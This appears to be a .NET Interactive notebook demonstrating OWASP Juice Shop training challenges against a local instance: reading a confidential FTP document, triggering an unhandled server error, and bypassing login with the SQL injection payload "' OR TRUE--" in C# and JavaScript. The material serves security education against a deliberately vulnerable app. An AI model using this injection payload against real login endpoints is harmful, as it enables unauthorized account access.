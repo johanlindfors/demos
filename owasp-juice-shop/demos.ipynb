{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Demos of OWASP Juice Shop challenges\r\n",
    "\r\n",
    "## Access a confidential document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": "OK\r\n"
     },
     "output_type": "unknown"
    }
   ],
   "source": [
    "using System.Net.Http;\r\n",
    "\r\n",
    "using(var client = new HttpClient()) {\r\n",
    "    var response = await client.GetAsync(\"http://localhost:3000/ftp/acquisitions.md\");\r\n",
    "\r\n",
    "    Console.WriteLine(response.StatusCode);\r\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": "<script type=\"text/javascript\">\nif (typeof window.createDotnetInteractiveClient === typeof Function) {\n    window.createDotnetInteractiveClient('http://localhost:56360/').then(async function (interactive) {\n        const console = interactive.getConsole('387');\n        const notebookScope = getDotnetInteractiveScope('http://localhost:56360/');\n        try {\n\nawait Object.getPrototypeOf(async function() {}).constructor(\n    \"interactive\",\n    \"console\",\n    \"notebookScope\",\n    \"const request = new XMLHttpRequest();\\r\\nconst url = \\u0027http://localhost:3000/ftp/acquisitions.md\\u0027;\\r\\nrequest.open(\\\"GET\\\", url);\\r\\nrequest.send();\\r\\n\\r\\nrequest.onload = (e) =\\u003e {\\r\\n    alert(request.response);\\r\\n}\"\n)(\n    interactive,\n    console,\n    notebookScope\n);\n\n        } catch (err) {\n            interactive.failCommand(err, '387');\n        } finally {\n            await interactive.waitForAllEventsToPublish('387');\n            await interactive.markExecutionComplete('387');\n        }\n    });\n}\n</script>"
     },
     "output_type": "unknown"
    }
   ],
   "source": [
    "const request = new XMLHttpRequest();\r\n",
    "const url = 'http://localhost:3000/ftp/acquisitions.md';\r\n",
    "request.open(\"GET\", url);\r\n",
    "request.send();\r\n",
    "\r\n",
    "request.onload = (e) => {\r\n",
    "    alert(request.response);\r\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Provoke an error that is neither very gracefully nor consistently handled\r\n",
    "Any request that cannot be properly handled by the server will eventually be passed to a global error handling component that sends an error page to the client that includes a stack trace and other sensitive information. The restful API behaves in a similar way, passing back a JSON error object with sensitive data, such as SQL query strings."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": "InternalServerError\r\n"
     },
     "output_type": "unknown"
    }
   ],
   "source": [
    "using System.Net.Http;\r\n",
    "\r\n",
    "using(var client = new HttpClient()) {\r\n",
    "    var response = await client.GetAsync(\"http://localhost:3000/rest/qwertz\");\r\n",
    "\r\n",
    "    Console.WriteLine(response.StatusCode);\r\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Demonstrate a SQL Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name json\r\n",
    "{\r\n",
    "    \"email\": \"' OR TRUE--\",\r\n",
    "    \"password\": \"12345\"\r\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": "OK\r\n"
     },
     "output_type": "unknown"
    }
   ],
   "source": [
    "#!share json --from value\r\n",
    "\r\n",
    "using System.Net.Http;\r\n",
    "\r\n",
    "using(var client = new HttpClient()) {\r\n",
    "    var content = new StringContent(json, Encoding.UTF8, \"application/json\");\r\n",
    "    var response = await client.PostAsync(\"http://localhost:3000/rest/user/login\", content);\r\n",
    "\r\n",
    "    Console.WriteLine(response.StatusCode);\r\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now let's try the same example with plain javascript"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": "<script type=\"text/javascript\">\nif (typeof window.createDotnetInteractiveClient === typeof Function) {\n    window.createDotnetInteractiveClient('http://localhost:56360/').then(async function (interactive) {\n        const console = interactive.getConsole('391');\n        const notebookScope = getDotnetInteractiveScope('http://localhost:56360/');\n        try {\n\nawait Object.getPrototypeOf(async function() {}).constructor(\n    \"interactive\",\n    \"console\",\n    \"notebookScope\",\n    \"const request = new XMLHttpRequest();\\r\\nconst url = \\\"http://localhost:3000/rest/user/login\\\";\\r\\nconst json =\\r\\n{\\r\\n    \\\"email\\\": \\\"\\u0027 OR TRUE--\\\",\\r\\n    \\\"password\\\": \\\"12345\\\"\\r\\n};\\r\\n\\r\\nrequest.open(\\\"POST\\\", url);\\r\\nrequest.setRequestHeader(\\\"Content-Type\\\", \\\"application/json\\\");\\r\\nrequest.send(json);\\r\\n\\r\\nrequest.onload = (e) =\\u003e {\\r\\n    alert(request.response);\\r\\n}\"\n)(\n    interactive,\n    console,\n    notebookScope\n);\n\n        } catch (err) {\n            interactive.failCommand(err, '391');\n        } finally {\n            await interactive.waitForAllEventsToPublish('391');\n            await interactive.markExecutionComplete('391');\n        }\n    });\n}\n</script>"
     },
     "output_type": "unknown"
    }
   ],
   "source": [
    "const request = new XMLHttpRequest();\r\n",
    "const url = \"http://localhost:3000/rest/user/login\";\r\n",
    "const json =\r\n",
    "{\r\n",
    "    \"email\": \"' OR TRUE--\",\r\n",
    "    \"password\": \"12345\"\r\n",
    "};\r\n",
    "\r\n",
    "request.open(\"POST\", url);\r\n",
    "request.setRequestHeader(\"Content-Type\", \"application/json\");\r\n",
    "request.send(json);\r\n",
    "\r\n",
    "request.onload = (e) => {\r\n",
    "    alert(request.response);\r\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  },
  "orig_nbformat": 2
 },
 "nbformat": 4,
 "nbformat_minor": 2
}